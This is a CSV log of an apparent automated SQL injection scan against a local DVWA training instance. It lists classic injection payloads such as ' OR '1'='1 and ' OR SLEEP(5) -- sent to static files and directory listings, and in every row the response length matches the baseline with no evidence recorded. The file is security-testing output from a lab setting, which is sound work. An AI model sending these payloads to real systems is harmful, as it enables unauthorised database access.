page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.00514,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR 1=1--,200,0.004555,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,""" OR """" = """,200,0.00484,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.007823,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,1' OR '1'='1,200,0.005249,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR '1'='1,200,0.003292,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR '1'='1' -- ,200,0.004069,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR 1=1--,200,0.003805,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,""" OR """" = """,200,0.00353,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR SLEEP(5) --,200,0.003763,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,1' OR '1'='1,200,0.003893,842,,842,0.003606
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR '1'='1,200,0.003828,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR '1'='1' -- ,200,0.005441,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR 1=1--,200,0.004041,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,""" OR """" = """,200,0.005803,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR SLEEP(5) --,200,0.004424,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,1' OR '1'='1,200,0.006318,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR '1'='1,200,0.00407,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR '1'='1' -- ,200,0.005223,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR 1=1--,200,0.003946,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,""" OR """" = """,200,0.00504,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR SLEEP(5) --,200,0.004296,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,1' OR '1'='1,200,0.004802,304,,304,0.004574
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR '1'='1,200,0.004243,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR '1'='1' -- ,200,0.004087,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR 1=1--,200,0.005398,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,""" OR """" = """,200,0.004815,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR SLEEP(5) --,200,0.004517,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,1' OR '1'='1,200,0.004231,240,,240,0.005577
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR '1'='1,200,0.004836,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR '1'='1' -- ,200,0.00454,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR 1=1--,200,0.004799,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,""" OR """" = """,200,0.003375,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR SLEEP(5) --,200,0.00538,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,1' OR '1'='1,200,0.004279,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR '1'='1,200,0.003866,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR '1'='1' -- ,200,0.003988,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR 1=1--,200,0.003573,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,""" OR """" = """,200,0.003845,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR SLEEP(5) --,200,0.003101,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,1' OR '1'='1,200,0.003575,45,,45,0.004204
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR '1'='1,200,0.004592,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.0035,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR 1=1--,200,0.004845,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,""" OR """" = """,200,0.005113,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004652,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004753,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR '1'='1,200,0.004569,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.003768,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR 1=1--,200,0.004483,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,""" OR """" = """,200,0.004285,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.004755,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,1' OR '1'='1,200,0.004839,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR '1'='1,200,0.004265,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR '1'='1' -- ,200,0.005252,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR 1=1--,200,0.005248,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,""" OR """" = """,200,0.006706,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR SLEEP(5) --,200,0.005458,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,1' OR '1'='1,200,0.005333,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR '1'='1,200,0.006128,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.006343,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR 1=1--,200,0.005523,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,""" OR """" = """,200,0.005758,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.004239,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,1' OR '1'='1,200,0.006808,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR '1'='1,200,0.005024,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.005151,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR 1=1--,200,0.006675,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,""" OR """" = """,200,0.005304,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.005403,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,1' OR '1'='1,200,0.004354,1377,,1377,0.005337
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR '1'='1,200,0.003127,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR '1'='1' -- ,200,0.002503,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR 1=1--,200,0.003765,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,""" OR """" = """,200,0.003575,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR SLEEP(5) --,200,0.003075,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,1' OR '1'='1,200,0.008176,446,,446,0.003953
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR '1'='1,200,0.00487,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR '1'='1' -- ,200,0.005132,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR 1=1--,200,0.004385,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,""" OR """" = """,200,0.005145,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR SLEEP(5) --,200,0.004623,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,1' OR '1'='1,200,0.004728,401,,401,0.005647
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR '1'='1,200,0.006814,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR '1'='1' -- ,200,0.005244,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR 1=1--,200,0.004326,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,""" OR """" = """,200,0.005499,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR SLEEP(5) --,200,0.00548,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,1' OR '1'='1,200,0.003831,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR '1'='1,200,0.024815,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.005343,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR 1=1--,200,0.003933,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,""" OR """" = """,200,0.004605,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.003365,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,1' OR '1'='1,200,0.003769,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR '1'='1,200,0.004166,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR '1'='1' -- ,200,0.002568,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR 1=1--,200,0.002834,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,""" OR """" = """,200,0.004015,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR SLEEP(5) --,200,0.004818,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,1' OR '1'='1,200,0.0043,287,,287,0.004768
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR '1'='1,200,0.005355,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR '1'='1' -- ,200,0.004075,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR 1=1--,200,0.005312,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,""" OR """" = """,200,0.005228,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR SLEEP(5) --,200,0.006385,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,1' OR '1'='1,200,0.003708,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR '1'='1,200,0.005887,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.005748,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR 1=1--,200,0.005353,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,""" OR """" = """,200,0.005091,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.005908,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,1' OR '1'='1,200,0.00623,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR '1'='1,200,0.004817,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR '1'='1' -- ,200,0.004753,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR 1=1--,200,0.006528,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,""" OR """" = """,200,0.004898,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR SLEEP(5) --,200,0.006558,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,1' OR '1'='1,200,0.004294,731,,731,0.004069
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR '1'='1,200,0.004435,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR '1'='1' -- ,200,0.005833,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR 1=1--,200,0.004369,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,""" OR """" = """,200,0.003686,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR SLEEP(5) --,200,0.004313,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,1' OR '1'='1,200,0.004908,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR '1'='1,200,0.004615,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.005332,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR 1=1--,200,0.004849,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,""" OR """" = """,200,0.004556,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.005999,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,1' OR '1'='1,200,0.00481,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR '1'='1,200,0.004542,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.004887,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR 1=1--,200,0.004958,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,""" OR """" = """,200,0.005117,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.005563,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004854,2167,,2167,0.005458
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR '1'='1,200,0.003714,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR '1'='1' -- ,200,0.005585,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR 1=1--,200,0.004128,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,""" OR """" = """,200,0.004526,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR SLEEP(5) --,200,0.005349,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,1' OR '1'='1,200,0.00485,1500,,1500,0.005429
